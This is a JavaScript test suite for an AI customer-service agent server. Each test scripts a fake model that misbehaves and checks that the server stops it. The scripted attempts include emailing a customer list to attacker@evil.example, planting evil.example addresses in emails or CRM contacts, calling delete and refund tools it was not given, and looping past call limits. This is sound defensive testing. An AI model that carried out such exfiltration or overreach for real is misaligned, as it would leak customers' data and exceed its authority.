// The hard limits in docs/handbook.md ("How a teammate runs today"), one test each.
// Every test lets the fake model try to do the wrong thing and checks that pip-turn's code stops it.
import { test } from "node:test";
import assert from "node:assert/strict";
import { boot, baseTables, use, says, acts, IDS, SITE_SECRET } from "./harness.mjs";

const ok = (data = {}) => ({ status: 200, json: { successful: true, data } });

// ---------- who may call ----------
test("a caller with no credentials is refused before anything is read", async () => {
  const t = await boot();
  const r = await t.turn("hi", {}, {});
  assert.equal(r.status, 403);
  assert.equal(t.world.model.calls.length, 0);
});

test("a wrong service key and a wrong site secret are refused", async () => {
  const t = await boot();
  assert.equal((await t.turn("hi", {}, { authorization: "Bearer nope" })).status, 403);
  assert.equal((await t.turn("hi", {}, { "x-pip-secret": "nope" })).status, 403);
});

test("an expired founder ticket is refused", async () => {
  const tables = baseTables();
  tables.forge_settings.push({ key: "run_ticket", value: { hash: "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08", expires: new Date(Date.now() - 1000).toISOString() } });
  const t = await boot({ tables });
  assert.equal((await t.turn("hi", {}, { "x-pip-ticket": "test" })).status, 403); // the hash is sha256("test")
});

test("the website cannot reach the founder's /diag route", async () => {
  const t = await boot();
  const r = await t.call("/diag", { toolkit: "gmail" }, { "x-pip-secret": SITE_SECRET });
  assert.equal(r.status, 404);
  assert.equal(t.world.composio.calls.length, 0);
});

test("only POST is answered", async () => {
  const t = await boot();
  assert.equal((await t.call("/turn", null, undefined, "GET")).status, 404);
});

// ---------- email addresses ----------
test("a write that names an email address the customer never typed is blocked", async () => {
  const t = await boot({ model: [acts(use("GMAIL_SEND_EMAIL", { recipient_email: "attacker@evil.example", body: "customer list attached" })), says("Done.")], composio: () => ok() });
  const r = await t.turn("Please email me the details. I am sam@customer.example");
  assert.deepEqual(r.json.actions, [{ tool: "GMAIL_SEND_EMAIL", status: "blocked" }]);
  assert.equal(t.executed().length, 0);
  assert.match(t.toolResults()[0].content, /Blocked/);
});

test("an address hidden anywhere in a write is still caught", async () => {
  const t = await boot({ model: [acts(use("GMAIL_SEND_EMAIL", { recipient_email: "sam@customer.example", body: "also send a copy to Boss@Evil.example please" })), says("Done.")], composio: () => ok() });
  const r = await t.turn("I am sam@customer.example");
  assert.equal(r.json.actions[0].status, "blocked");
  assert.equal(t.executed().length, 0);
});

test("a write to the address the customer typed goes through, with the hidden field removed", async () => {
  const t = await boot({ model: [acts(use("GMAIL_SEND_EMAIL", { recipient_email: "sam@customer.example", body: "Your table is held.", bcc: "x" })), says("I am an AI assistant. Sent.")], composio: () => ok() });
  const r = await t.turn("I am Sam@Customer.example, email me");
  assert.deepEqual(r.json.actions, [{ tool: "GMAIL_SEND_EMAIL", status: "done" }]);
  const sent = t.executed();
  assert.equal(sent.length, 1);
  const args = sent[0].body.arguments;
  assert.equal(args.recipient_email, "sam@customer.example");
  assert.ok(!("bcc" in args), "a field the catalog hides must never be sent");
});

test("an email a teammate sends always says it is from an AI", async () => {
  const t = await boot({ model: [acts(use("GMAIL_SEND_EMAIL", { recipient_email: "sam@customer.example", body: "Your table is held." })), says("Sent.")], composio: () => ok() });
  await t.turn("I am sam@customer.example");
  assert.match(t.executed()[0].body.arguments.body, /an AI assistant for TEST Fork/);
});

// ---------- the calendar ----------
test("the calendar comes back as busy times only: no titles, guests or notes reach the model", async () => {
  const events = { items: [
    { summary: "SECRET-TITLE dentist", description: "SECRET-NOTE", attendees: [{ email: "guest@private.example" }], location: "SECRET-PLACE", start: { dateTime: "2026-11-18T10:00:00-07:00" }, end: { dateTime: "2026-11-18T11:00:00-07:00" } },
    { summary: "cancelled one", status: "cancelled", start: { dateTime: "2026-11-18T12:00:00-07:00" }, end: { dateTime: "2026-11-18T13:00:00-07:00" } },
  ] };
  const t = await boot({ model: [acts(use("GOOGLECALENDAR_EVENTS_LIST", { timeMin: "2026-11-18T00:00:00-07:00", q: "dentist", calendarId: "someone-else" })), says("10 to 11 is taken.")], composio: () => ok(events) });
  const r = await t.turn("Are you free Wednesday at 10?");
  assert.equal(r.status, 200);
  const everythingTheModelSaw = JSON.stringify(t.world.model.calls);
  for (const leak of ["SECRET-TITLE", "SECRET-NOTE", "SECRET-PLACE", "guest@private.example", "cancelled one"]) assert.ok(!everythingTheModelSaw.includes(leak), leak + " reached the model");
  assert.ok(!JSON.stringify(r.json).includes("SECRET"));
  const result = JSON.parse(t.toolResults()[0].content);
  assert.deepEqual(result.busy, [{ start: "2026-11-18T10:00:00-07:00", end: "2026-11-18T11:00:00-07:00" }]);
  const args = t.executed()[0].body.arguments;
  assert.equal(args.calendarId, "primary", "a fixed value must win over what the model sent");
  assert.ok(!("q" in args), "a hidden field must be dropped");
});

test("fields the catalog hides or fixes are not even shown to the model", async () => {
  const t = await boot();
  await t.turn("hi");
  const cal = t.world.model.calls[0].tools.find((x) => x.name === "GOOGLECALENDAR_EVENTS_LIST");
  assert.deepEqual(Object.keys(cal.input_schema.properties), ["timeMin", "timeMax"]);
  assert.deepEqual(cal.input_schema.required, ["timeMin"]);
});

test("a calendar answer that cannot be read is never turned into 'you are free'", async () => {
  const t = await boot({ model: [acts(use("GOOGLECALENDAR_EVENTS_LIST", { timeMin: "x" })), says("A team member will confirm.")], composio: () => ok({ unexpected: true }) });
  await t.turn("Are you free at 10?");
  const res = t.toolResults()[0];
  assert.equal(res.is_error, true);
  assert.match(res.content, /could not be read/);
});

// ---------- how much one turn may do ----------
test("at most 6 tool calls run in one turn", async () => {
  const eight = Array.from({ length: 8 }, () => use("capture_lead", { need: "a table" }));
  const t = await boot({ model: [acts(...eight), says("Saved.")] });
  const r = await t.turn("book me");
  assert.equal(r.json.actions.length, 6);
  assert.equal(t.inserts("notifications").length, 6);
  const refused = t.toolResults().filter((x) => /Too many actions/.test(x.content));
  assert.equal(refused.length, 2);
});

test("the 6-call limit holds across rounds, not only inside one", async () => {
  const round = () => acts(use("capture_lead", { need: "a" }), use("capture_lead", { need: "b" }), use("capture_lead", { need: "c" }), use("capture_lead", { need: "d" }));
  const t = await boot({ model: [round(), round(), says("Saved.")] });
  const r = await t.turn("book me");
  assert.equal(r.json.actions.length, 6);
});

test("at most 5 rounds with the model in one turn", async () => {
  const t = await boot({ model: Array.from({ length: 20 }, () => () => acts(use("notify_owner", { summary: "again" }))) });
  const r = await t.turn("loop forever");
  assert.equal(t.world.model.calls.length, 5);
  assert.equal(r.status, 200);
  assert.ok(r.json.reply.length > 0, "the customer still gets an answer");
});

// ---------- real actions only when live or on the TEST list ----------
test("a teammate that is not live, for a business not on the TEST list, changes nothing", async () => {
  const tables = baseTables(); tables.skill_specs[0].status = "approved";
  const t = await boot({ tables, model: [acts(use("GMAIL_SEND_EMAIL", { recipient_email: "sam@customer.example", body: "hello" }), use("GOOGLECALENDAR_EVENTS_LIST", { timeMin: "x" })), says("A team member will follow up.")], composio: () => ok({ items: [] }) });
  const r = await t.turn("I am sam@customer.example");
  assert.equal(r.json.real, false);
  assert.deepEqual(r.json.actions.map((a) => a.status), ["test_only", "test_only"]);
  assert.equal(t.executed().length, 0);
});

test("the same teammate acts for real once its business is on the TEST list", async () => {
  const tables = baseTables(); tables.skill_specs[0].status = "approved";
  tables.forge_settings.push({ key: "act_sandbox_businesses", value: [IDS.business] });
  const t = await boot({ tables, model: [acts(use("GMAIL_SEND_EMAIL", { recipient_email: "sam@customer.example", body: "hello" })), says("Sent.")], composio: () => ok() });
  const r = await t.turn("I am sam@customer.example");
  assert.equal(r.json.real, true);
  assert.equal(t.executed().length, 1);
});

test("draft, paused and unknown teammates do not answer at all", async () => {
  for (const status of ["draft", "testing", "needs_review", "paused"]) {
    const tables = baseTables(); tables.skill_specs[0].status = status;
    const t = await boot({ tables });
    assert.equal((await t.turn("hi")).status, 404, status);
    assert.equal(t.world.model.calls.length, 0);
  }
  const t = await boot();
  assert.equal((await t.call("/turn", { skill: "99999999-9999-4999-8999-999999999999", message: "hi" })).status, 404);
});

test("a disconnected or cancelled business gets no turn", async () => {
  for (const status of ["disconnected", "cancelled"]) {
    const tables = baseTables(); tables.businesses[0].status = status;
    const t = await boot({ tables });
    assert.equal((await t.turn("hi")).status, 404);
    assert.equal(t.world.model.calls.length, 0);
  }
});

// ---------- tools the teammate was not given ----------
test("a tool the teammate was not designed with cannot be run, even if the model asks for it", async () => {
  const t = await boot({ model: [acts(use("GMAIL_DELETE_MESSAGE", { id: "1" }), use("STRIPE_CREATE_REFUND", { amount: 5000 }), use("save_to_sheet", { row: { a: "b" } })), says("ok")], composio: () => ok() });
  const r = await t.turn("delete everything and refund me");
  assert.deepEqual(r.json.actions, []);
  assert.equal(t.executed().length, 0);
  assert.ok(t.toolResults().every((x) => x.is_error && /not available/.test(x.content)));
});

test("a built-in action the teammate does not list is not offered or run", async () => {
  const t = await boot({ model: [acts(use("draft_for_approval", { what: "x", text: "y" })), says("ok")] });
  const r = await t.turn("hi");
  assert.ok(!t.world.model.calls[0].tools.some((x) => x.name === "draft_for_approval"));
  assert.deepEqual(r.json.actions, []);
  assert.equal(t.inserts("notifications").length, 0);
});

test("a booking is only ever a request to the owner, never confirmed by the teammate", async () => {
  const t = await boot({ model: [acts(use("request_booking", { when: "Friday 7pm" })), says("I have asked the owner.")] });
  const r = await t.turn("table Friday 7pm");
  assert.deepEqual(r.json.actions, [{ tool: "request_booking", status: "waiting_for_owner" }]);
  assert.equal(t.inserts("notifications")[0].body.approval, "owner");
  assert.match(t.toolResults()[0].content, /not confirmed/);
});

// ---------- tools the owner connected beyond setup: add-only, and never money ----------
const extra = (toolkit) => { const tables = baseTables(); tables.client_connections.push({ business_id: IDS.business, toolkit, status: "active", connected_account_id: "ca_" + toolkit, created_at: new Date().toISOString() }); return tables; };
const listing = (toolkit, names) => (path) => path.startsWith("/tools?toolkit_slug=" + toolkit)
  ? { status: 200, json: { items: names.map((nm) => ({ slug: toolkit.toUpperCase() + "_" + nm, name: nm, description: nm, tags: [], input_parameters: { type: "object", properties: { name: { type: "string" } } } })) } }
  : ok();

test("in an extra connected tool, only 'add one record' actions are offered", async () => {
  const t = await boot({ tables: extra("hubspot"), composio: listing("hubspot", ["CREATE_CONTACT", "UPDATE_CONTACT", "DELETE_CONTACT", "LIST_CONTACTS", "SEND_EMAIL", "CREATE_CONTACTS_BATCH", "MERGE_CONTACTS", "ADD_NOTE"]) });
  await t.turn("hi");
  const offered = t.world.model.calls[0].tools.map((x) => x.name).filter((x) => x.startsWith("HUBSPOT_"));
  assert.deepEqual(offered.sort(), ["HUBSPOT_ADD_NOTE", "HUBSPOT_CREATE_CONTACT"]);
});

test("an action tagged as destructive, update or read-only is never opened automatically", async () => {
  const t = await boot({ tables: extra("hubspot"), composio: (path) => path.startsWith("/tools?toolkit_slug=hubspot")
    // two ways a tool list marks these: a plain tag, or a "...Hint" tag. Only an untagged or "createHint" action may pass.
    ? { status: 200, json: { items: [["destructive"], ["update", "createHint"], ["readonly"], ["deprecated"], ["openWorldHint"], ["createHint"]].map((tags, i) => ({ slug: ["HUBSPOT_CREATE_LEAD", "HUBSPOT_CREATE_TASK", "HUBSPOT_CREATE_NOTE", "HUBSPOT_CREATE_DEAL", "HUBSPOT_CREATE_TICKET", "HUBSPOT_CREATE_CONTACT"][i], tags, input_parameters: { type: "object", properties: {} } })) } } : ok() });
  await t.turn("hi");
  assert.deepEqual(t.world.model.calls[0].tools.map((x) => x.name).filter((x) => x.startsWith("HUBSPOT_")), ["HUBSPOT_CREATE_CONTACT"]);
});

test("money and payroll tools get no automatic actions at all", async () => {
  for (const kit of ["stripe", "quickbooks", "square", "gusto", "shopify", "paypal", "xero"]) {
    const t = await boot({ tables: extra(kit), composio: listing(kit, ["CREATE_CUSTOMER", "CREATE_CONTACT", "ADD_NOTE"]) });
    await t.turn("hi");
    const offered = t.world.model.calls[0].tools.map((x) => x.name).filter((x) => x.startsWith(kit.toUpperCase()));
    assert.deepEqual(offered, [], kit);
  }
});

test("the email-address limit also covers extra connected tools", async () => {
  const t = await boot({ tables: extra("hubspot"), model: [acts(use("HUBSPOT_CREATE_CONTACT", { name: "x", email: "planted@evil.example" })), says("ok")], composio: listing("hubspot", ["CREATE_CONTACT"]) });
  const r = await t.turn("add me");
  assert.equal(r.json.actions[0].status, "blocked");
  assert.equal(t.executed().length, 0);
});

// ---------- losing access pauses one job, not the teammate ----------
test("a sign-in that stopped working pauses only that job and the customer still gets an answer", async () => {
  const t = await boot({ model: [acts(use("GOOGLECALENDAR_EVENTS_LIST", { timeMin: "x" })), says("A team member will confirm the time.")], composio: () => ({ status: 401, json: { error: "token expired" } }) });
  const r = await t.turn("Are you free at 10?");
  assert.equal(r.status, 200);
  const pauses = t.rpcs("portal_job_pause");
  assert.equal(pauses.length, 1);
  assert.equal(pauses[0].args.p_job, "Calendar");
  assert.equal(pauses[0].args.p_reason, "expired_access");
  assert.deepEqual(r.json.actions, [{ tool: "GOOGLECALENDAR_EVENTS_LIST", status: "failed" }]);
});

test("a paused job's tools are withheld while the teammate's other jobs stay available", async () => {
  const tables = baseTables(); tables.agent_pauses.push({ spec_id: IDS.spec, job: "Calendar", resumed_at: null });
  const t = await boot({ tables });
  await t.turn("hi");
  const names = t.world.model.calls[0].tools.map((x) => x.name);
  assert.ok(!names.includes("GOOGLECALENDAR_EVENTS_LIST"));
  assert.ok(names.includes("GMAIL_SEND_EMAIL"));
  assert.match(t.world.model.calls[0].system[0].text, /Not available right now: Calendar/);
});

test("a connection that is not active, or is for a different tool than the catalog row, is not used", async () => {
  const tables = baseTables(); tables.business_connections[0].status = "pending"; tables.business_connections[1].choice = "outlook";
  const t = await boot({ tables });
  await t.turn("hi");
  const names = t.world.model.calls[0].tools.map((x) => x.name);
  assert.ok(!names.includes("GOOGLECALENDAR_EVENTS_LIST") && !names.includes("GMAIL_SEND_EMAIL"));
});

test("a tool switched off in the catalog is not offered", async () => {
  // pip-turn asks the database for enabled rows only; this checks it keeps asking that way.
  const tables = baseTables(); tables.tool_catalog[1].enabled = false;
  const t = await boot({ tables });
  await t.turn("hi");
  assert.ok(!t.world.model.calls[0].tools.some((x) => x.name === "GMAIL_SEND_EMAIL"));
});

// ---------- what the customer is told ----------
test("the first reply always says it is an AI, even when the model forgets", async () => {
  const t = await boot({ model: [says("Sure, we open at 9.")] });
  const r = await t.turn("when do you open?");
  assert.match(r.json.reply, /^This is Hallie, an AI assistant for TEST Fork\./);
});

test("a failed tool is never reported to the model as done", async () => {
  const t = await boot({ model: [acts(use("GMAIL_SEND_EMAIL", { recipient_email: "sam@customer.example", body: "hi" })), says("A team member will follow up.")], composio: () => ({ status: 200, json: { successful: false, error: "quota" } }) });
  const r = await t.turn("I am sam@customer.example");
  assert.equal(r.json.actions[0].status, "failed");
  assert.match(t.toolResults()[0].content, /Do not tell the customer it was done/);
});

test("when the spend guard says no, the model is not called, the owner is told and the customer gets a reply", async () => {
  const t = await boot();
  const r = await t.turn("hello?", { limited: true });
  assert.equal(t.world.model.calls.length, 0);
  assert.equal(r.json.live, false);
  assert.equal(t.inserts("notifications")[0].kind, "notify_owner");
  assert.match(r.json.reply, /A team member will get back to you/);
});

test("when the model is down, the owner is told and the customer is not left hanging", async () => {
  const t = await boot({ model: [null] });
  const r = await t.turn("hello?");
  assert.equal(r.status, 200);
  assert.equal(t.inserts("notifications").length, 1);
  assert.ok(r.json.reply.length > 0);
});

test("a customer message is cut to 1000 characters and a text reply to 700", async () => {
  const t = await boot({ model: [says("I am an AI assistant. " + "x".repeat(3000))] });
  const r = await t.turn("y".repeat(5000), { channel: "sms" });
  assert.equal(r.json.reply.length, 700);
  assert.equal(t.inserts("messages").find((m) => m.role === "user").content.length, 1000);
});

// ---------- keys stay inside ----------
test("no key or secret appears in anything the model is sent or the caller gets back", async () => {
  const t = await boot({ model: [acts(use("GOOGLECALENDAR_EVENTS_LIST", { timeMin: "x" })), says("ok")], composio: () => ok({ items: [] }) });
  const r = await t.turn("hi", {}, { "x-pip-secret": SITE_SECRET });
  const seen = JSON.stringify(t.world.model.calls) + JSON.stringify(r.json);
  for (const s of ["test-service-role", "test-model-key", "test-composio-key", SITE_SECRET]) assert.ok(!seen.includes(s), s + " leaked");
});

test("pip-turn talks only to the database, the model and Composio", async () => {
  const t = await boot({ tables: extra("hubspot"), model: [acts(use("GOOGLECALENDAR_EVENTS_LIST", { timeMin: "x" })), says("ok")], composio: listing("hubspot", ["CREATE_CONTACT"]) });
  await t.turn("hi");
  assert.deepEqual(t.world.outside, []);
});

test("the website does not get the founder's trace of steps and tools", async () => {
  const t = await boot({ model: [says("I am an AI assistant.")] });
  const r = await t.turn("hi", {}, { "x-pip-secret": SITE_SECRET });
  assert.ok(!("steps" in r.json) && !("offered" in r.json));
});
